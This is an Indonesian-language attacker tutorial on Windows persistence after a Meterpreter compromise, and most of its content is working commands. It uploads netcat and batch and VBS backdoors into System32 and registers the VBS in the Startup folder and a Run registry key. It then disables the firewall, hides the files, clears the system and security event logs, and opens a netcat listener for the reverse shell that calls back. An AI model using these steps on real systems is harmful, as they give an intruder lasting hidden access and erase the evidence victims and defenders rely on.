# Teknik Persistence pada Target

## A. Apa Itu Persistence?

[Persistence](https://www.offsec.com/metasploit-unleashed/persistent-backdoors/) adalah teknik yang digunakan oleh seorang penyerang untuk memastikan akses terus terjaga pada mesin target meskipun sistem direboot atau pengguna melakukan logout. Pada dasarnya, teknik ini akan memastikan bahwa payload atau backdoor tetap berjalan dan dapat diakses kembali pada sesi mendatang.

## B. Teknik Persistence Manual di Windows

Berikut ini adalah langkah-langkah untuk membuat persistence di mesin target (Windows) secara manual:

### 1. Upload Semua Backdoor

   Setelah berhasil masuk ke Meterpreter dari Metasploit, upload semua bakdoor yang ada di folder `backdoor` ke target mesin.

   1. Backdoor `nc.exe`:

      ```
      upload nc.exe C:\\Windows\\System32\\nc.exe
      ```

   2. Backdoor `backdoor.bat`:

      > Pada backdoor `backdoor.bat` ubah IP Address nya sesuai dengan IP Address yang kamu punya.

      ```
      upload backdoor.bat C:\\Windows\\System32\\backdoor.bat
      ```

   3. Backdoor `backdoor.vbs`:

      ```
      upload backdoor.vbs C:\\Windows\\System32\\backdoor.vbs
      ```
      
### 2. Salin Backdoor `backdoor.vbs` ke Folder Startup

> Pada bagian ini sampai ke Hapus Log, di meterpreter metasploit ketikkan shell untuk masuk ke CMD target mesin.

```
copy C:\Windows\System32\backdoor.vbs "C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
```

Ganti <USERNAME> dengan nama user yang ada pada target.

### 3. Tambahkan ke Registry

```
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\Windows\System32\backdoor.vbs" /f
```

### 4. Matikan Firewall

```
netsh advfirewall set allprofiles state off
```

###  5. Sembunyukan File

```
attrib +h C:\Windows\System32\nc.exe
attrib +h C:\Windows\System32\backdoor.bat
```
### 6. Hapus Log

```
wevtutil cl system
wevtutil cl security
```

### Siapkan Listener

```
nc -lvp 4444
```

Saat sistem target dinyalakan atau direstart, akses CMD dari sistem target akan diperoleh secara otomatis.
